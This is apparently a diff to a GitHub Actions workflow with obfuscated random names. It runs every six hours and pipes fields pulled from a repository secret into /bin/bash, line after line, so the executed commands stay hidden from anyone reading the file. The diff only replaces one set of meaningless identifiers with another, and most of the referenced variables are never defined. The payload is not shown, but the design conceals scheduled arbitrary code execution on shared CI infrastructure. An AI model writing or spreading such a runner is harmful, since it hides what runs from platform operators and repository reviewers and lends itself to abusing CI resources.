@@ -1,8 +1,9 @@
 name: zhouyiri2245
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
+    - cron: '54 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhouyiri2245
         env:
-          xxqr5504: ${{ secrets.xxqr5504 }}
+          s3636: ${{ secrets.s3636 }}
         run: |
-          echo $xxqr5504 | jq -r .sx1694 | /bin/bash
-          echo $zut7224 | jq -r .wbmu4 | /bin/bash
-          echo $jgax3 | jq -r .gydry366 | /bin/bash
-          echo $vdbwx55062 | jq -r .yctd69 | /bin/bash
-          echo $r8 | jq -r .g800 | /bin/bash
-          echo $hcb6 | jq -r .yp0429 | /bin/bash
-          echo $msp8638 | jq -r .u4 | /bin/bash
-          echo $xfi99 | jq -r .jxzo215 | /bin/bash
-          echo $w6476 | jq -r .itqah2 | /bin/bash
-          echo $ufds8847 | jq -r .oapmk74 | /bin/bash
-          echo $xq918 | jq -r .hl5004 | /bin/bash
+          echo $s3636 | jq -r .qxluk33 | /bin/bash
+          echo $cyd8 | jq -r .as6 | /bin/bash
+          echo $r8 | jq -r .mvd2664 | /bin/bash
+          echo $yxww643 | jq -r .uw31 | /bin/bash
+          echo $do62520 | jq -r .iknwa2 | /bin/bash
+          echo $xp0 | jq -r .ntx84297 | /bin/bash
+          echo $rctg69 | jq -r .q7 | /bin/bash
+          echo $cvtl17 | jq -r .c0170 | /bin/bash
+          echo $dkps9456 | jq -r .dj3658 | /bin/bash
+          echo $hs9 | jq -r .mx268 | /bin/bash
+          echo $j51475 | jq -r .xk869 | /bin/bash
+          echo $nvyzh8 | jq -r .uo3074 | /bin/bash
+          echo $teccu3 | jq -r .vktk06528 | /bin/bash
 
